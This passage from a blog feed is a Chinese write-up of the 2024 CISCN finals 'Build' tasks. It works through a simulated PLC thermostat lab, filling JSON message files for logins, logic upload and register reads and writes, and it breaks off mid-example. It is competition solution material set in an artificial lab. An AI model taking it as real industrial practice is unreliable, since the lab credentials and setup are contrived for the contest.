&lt;p&gt;参考：&lt;a href=&quot;https://xz.aliyun.com/t/13235&quot;&gt;https://xz.aliyun.com/t/13235&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>2024CISCN决赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/</id>
    <published>2024-07-12T02:29:03.000Z</published>
    <updated>2024-07-23T16:25:19.852Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2024.7.20-21成都</p><p>NISA-WhySerious位37全国二等奖</p><span id="more"></span><p>wp参考：</p><p><a href="https://blog.hxzzz.asia/archives/192/">https://blog.hxzzz.asia/archives/192/</a></p><hr><h1 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h1><p>过…过样例？</p><p>本关考验你中译中的能力（x</p><p>我就看了前两个任务，队友tql，连通俩宵ak了build</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721222456197.png" alt="image-20240721222456197"></p><h2 id="新手任务"><a href="#新手任务" class="headerlink" title="新手任务"></a>新手任务</h2><h3 id="背景应用了解"><a href="#背景应用了解" class="headerlink" title="背景应用了解"></a>背景应用了解</h3><h4 id="模拟工程师登录流程"><a href="#模拟工程师登录流程" class="headerlink" title="模拟工程师登录流程"></a>模拟工程师登录流程</h4><blockquote><p>在工程师用户（instance&#x2F;engineer&#x2F;user)目录下，编写engineer_login.msg， 填充工程师用户名与口令, 而后试运行users_login.sh，确认用户登录成功。</p></blockquote><p>engineer_login.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用json格式定义了cube架构中一个格式为（GENERAL_RETURN,STRING)的数据项，这个数据项是一个通用数据项，由两个字符串name和return_value组成：</p><ul><li>name用来描述数据项的类型或用途，这里name取值为login，表示该数据项用于登录</li><li>return_value则填充该数据项具体内容，return_value的引号内则按照“用户名：口令”的方式填充内容</li></ul><p>注：用户名和口令信息在管理中心工作目录(instance&#x2F;monitor&#x2F;center)里寻找</p><p><a id="user.list">instance&#x2F;monitor&#x2F;center&#x2F;user.list</a></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"USER_DEFINE"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"SERVER_STATE"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"123"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"456"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"sun"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_MONITOR"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"123"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"li"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"123"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"zhou"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"456"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"wu"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"456"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>于是填入engineer_login.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"zhao:123"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后运行users_login.sh即可</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712104227225.png" alt="image-20240712104227225"></p><hr><h4 id="模拟逻辑代码上传"><a href="#模拟逻辑代码上传" class="headerlink" title="模拟逻辑代码上传"></a>模拟逻辑代码上传</h4><blockquote><p>在2024buildup&#x2F;src&#x2F;logic&#x2F;thermostat_logic目录下写了一个模拟PLC行为的代码，用其源码thermostat_logic.c来模拟PLC源码，其编译后的动态库libthermostat_logic.so来模拟PLC逻辑。请在工程师用户目录编写code_upload.msg，填写正确的上传代码信息，试运行并完成代码上传功能。</p></blockquote><p>instance&#x2F;engineer&#x2F;user&#x2F;code_upload.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_CODE"</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>(PLC_ENGINEER,LOGIC_UPLOAD)</code>数据结构：</p><table><thead><tr><th>元素名称</th><th>元素类型</th><th>元素大小</th><th>信息内容</th><th>备注</th></tr></thead><tbody><tr><td>plc_devname</td><td>0结尾字符串</td><td>&lt;&#x3D;32字节</td><td>设备的名称</td><td></td></tr><tr><td>logic_filename</td><td>0结尾字符串</td><td>&lt;&#x3D;32字节</td><td>代码文件的名称</td><td></td></tr><tr><td>type</td><td>ENUM</td><td>4字节</td><td>文件类型</td><td>使用<strong>enum_plc_file_type枚举</strong></td></tr><tr><td>uuid</td><td>UUID</td><td>32字节</td><td>代码的摘要值</td><td></td></tr><tr><td>author</td><td>0结尾字符串</td><td>&lt;&#x3D;32字节</td><td>代码作者的名称</td><td></td></tr><tr><td>uploader</td><td>0结尾字符串</td><td>&lt;&#x3D;32字节</td><td>上传行为执行者名称</td><td></td></tr><tr><td>time</td><td>INT</td><td>4字节</td><td>上传行为执行时间</td><td></td></tr></tbody></table><p>修改code_upload.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">"thermostat_logic.c"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_CODE"</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712110019651.png" alt="image-20240712110019651"></p><hr><h4 id="模拟二进制逻辑上传"><a href="#模拟二进制逻辑上传" class="headerlink" title="模拟二进制逻辑上传"></a>模拟二进制逻辑上传</h4><blockquote><p>编辑task_1_1.sh，删除对应任务的sh前面的#号，打开注释行，并在工程师用户目录下编写bin_upload.msg，填写正确的plc逻辑信息，再运行task_1_1.sh,以实现模拟的二进制逻辑上传。</p></blockquote><p>bin_upload.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先看一下type对应的枚举类型：</p><p>文件类型定义<code>emu_plc_file_type</code>（位于PLC模拟操作的plc_emu.json）</p><table><thead><tr><th>枚举项名称</th><th>枚举数值</th><th>内容</th><th>备注</th></tr></thead><tbody><tr><td>FILE_CODE</td><td>0x01</td><td>代码文件</td><td></td></tr><tr><td>FILE_LOGIC</td><td>0x02</td><td>PLC逻辑文件</td><td>由对应代码文件生成</td></tr><tr><td>FILE_DESC</td><td>0x10</td><td>描述文件</td><td>保留待以后选用</td></tr><tr><td>FILE_RULE</td><td>0x20</td><td>制度文件</td><td>保留待以后选用</td></tr></tbody></table><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712111831356.png" alt="image-20240712111831356"></p><p>修改bin_upload.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">"libthermostat_logic.so"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_LOGIC"</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712120702394.png" alt="image-20240712120702394"></p><hr><h4 id="模拟PLC逻辑启动"><a href="#模拟PLC逻辑启动" class="headerlink" title="模拟PLC逻辑启动"></a>模拟PLC逻辑启动</h4><blockquote><p>编辑task_1_1.sh，打开“启动plc设备模拟”提示后面的注释项，运行task_1_1.sh</p></blockquote><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712121057598.png" alt="image-20240712121057598"></p><p>观察plc设备工作目录instance&#x2F;plc&#x2F;device&#x2F;下的message_log目录，发现其增加了logic_send.log文件</p><blockquote><p>这里message_log目录记录的是各用例模拟运行的过程，logic_send则是在设备工作目录下配置的系统自动监控流程的模拟业务流</p></blockquote><p>instance&#x2F;plc&#x2F;device&#x2F;router_policy.cfg</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712121529217.png" alt="image-20240712121529217"></p><p>主要看下半部分</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"policy_head"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"logic_send"</span><span class="token punctuation">,</span>       <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"DELIVER"</span><span class="token punctuation">,</span>        <span class="token property">"sender"</span><span class="token operator">:</span><span class="token string">"logic"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"MATCH_RULES"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"op"</span><span class="token operator">:</span><span class="token string">"OR"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"MODBUS_CMD"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"ROUTE_RULES"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"main_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"device"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"logic"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里用消息路由来将多个模块的功能串起来模拟业务流程：</p><ul><li><p>开头部分描述了<strong>消息路由的名称、类型和起始模块</strong></p></li><li><p>中间部分表示<strong>当消息在起始模块位置时的格式和内容信息</strong>：</p><p>当起始模块生成消息(模块中用<code>message_create</code>函数生成，且最后激活消息参数设为NULL时）与其格式要求一致时（在这里就是消息类型为<code>MODBUS_CMD</code>，用来模拟modbus协议命令)，会被识别为该路由的起始消息</p></li><li><p>最后部分则说明消息<strong>先后通过device和logic模块</strong>后结束传递：它其实模拟了plc逻辑（用logic模块模拟）发出命令给device,由device处理后返回logic模块的过程</p></li></ul><p>当系统模拟运行时，观察设备工作目录instance&#x2F;plc&#x2F;device中日志目录message_log中的logic_send.msg文件将显示该路由中的信息，由于该过程循环进行，因此可看到大量信息</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712122119408.png" alt="image-20240712122119408"></p><hr><h4 id="模拟操作员登录行为"><a href="#模拟操作员登录行为" class="headerlink" title="模拟操作员登录行为"></a>模拟操作员登录行为</h4><blockquote><p>在task_1_1.sh脚本的“启动hacker”提示、“启动操作员站”提示和“执行操作员登录行为”提示后面打开被注释的命令，并编辑操作员用户工作目录下的operator_login.msg，添加操作员用户的名称和口令信息，而后进行试登录。如登录成功，则表明通过该过程。</p></blockquote><p>instance&#x2F;operator&#x2F;user&#x2F;operator_login.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和工程师登录一样，在<code>return_value</code>添加<code>用户名:口令</code>，用户要选择user.list里<code>&quot;role&quot;:&quot;PLC_OPERATOR&quot;</code>的</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"qian:456"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712122832291.png" alt="image-20240712122832291"></p><hr><h4 id="模拟操作员的一组plc操作"><a href="#模拟操作员的一组plc操作" class="headerlink" title="模拟操作员的一组plc操作"></a>模拟操作员的一组plc操作</h4><blockquote><p>打开task_1_1.sh最后几条注释掉的命令，然后，修改操作员用户工作目录下的plc_start.msg , plc_read_t.msg和plc_set_t.msg，分别实现打开plc温度调节开关，观察plc当前环境温度以及将plc恒温温度设置为39度（3900）的目标</p></blockquote><p>instance&#x2F;operator&#x2F;user&#x2F;plc_start.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ON"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>instance&#x2F;operator&#x2F;user&#x2F;plc_read_t.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>instance&#x2F;operator&#x2F;user&#x2F;plc_set_t.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看一下<code>(PLC_OPERATOR,PLC_CMD)</code>数据结构的定义：</p><table><thead><tr><th>元素名称</th><th>元素类型</th><th>元素大小</th><th>信息内容</th><th>备注</th></tr></thead><tbody><tr><td>plc_devname</td><td>0结尾字符串</td><td>&lt;&#x3D;32字节</td><td>设备的名称</td><td></td></tr><tr><td>action</td><td>ENUM</td><td>4字节</td><td>操作员的行为</td><td>使用enum_plc_operator_action</td></tr><tr><td>action_desc</td><td>0结尾字符串</td><td>&lt;&#x3D;32字节</td><td>操作员行为描述</td><td><strong>使用寄存器名称进行描述</strong></td></tr><tr><td>value</td><td>INT</td><td>4字节</td><td>寄存器设置的值</td><td></td></tr><tr><td>plc_operator</td><td>0结尾字符串</td><td>&lt;&#x3D;32字节</td><td>操作者的名称</td><td></td></tr><tr><td>time</td><td>INT</td><td>4字节</td><td>操作时间</td><td></td></tr></tbody></table><p>看一下操作员操作类型定义 <code>enum_plc_operator_action</code>（位于plc_emu.json）</p><table><thead><tr><th>枚举项名称</th><th>枚举数值</th><th>内容</th><th>备注</th></tr></thead><tbody><tr><td>ACTION_ON</td><td>0x01</td><td>开启操作</td><td></td></tr><tr><td>ACTION_OFF</td><td>0x02</td><td>关闭操作</td><td></td></tr><tr><td>ACTION_MONITOR</td><td>0x03</td><td>监视操作</td><td>读取寄存器信息</td></tr><tr><td>ACTION_ADJUST</td><td>0x04</td><td>设置操作</td><td>调节恒温设置、档位设置</td></tr></tbody></table><p>再看一下PLC设备寄存器设计：</p><table><thead><tr><th>寄存器名称</th><th>寄存器类型</th><th>寄存器地址</th><th>寄存器内容</th><th>备注</th></tr></thead><tbody><tr><td>device_S</td><td>coil</td><td>1</td><td>恒温箱开关</td><td>0为关闭，1为启动</td></tr><tr><td>set_T</td><td>Holding Registers</td><td>40003</td><td>恒温数值要求</td><td>短整型</td></tr><tr><td>curr_T</td><td>Input Registers</td><td>30004</td><td>恒温箱当前温度</td><td>短整型</td></tr><tr><td>heating_S</td><td>Coil</td><td>2</td><td>电热丝开关</td><td>0为关，1为制热</td></tr><tr><td>heating_G</td><td>Holding Registers</td><td>40005</td><td>电流档位</td><td>0-9档</td></tr></tbody></table><p>修改plc_start.msg，打开plc温度调节开关（这里最逆天的是要开的是电热丝）</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ON"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"heating_S"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改plc_read_t.msg，观察plc当前环境温度</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"MONITOR"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"curr_T"</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改plc_set_t.msg，将plc恒温温度设置为39度（3900）</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token 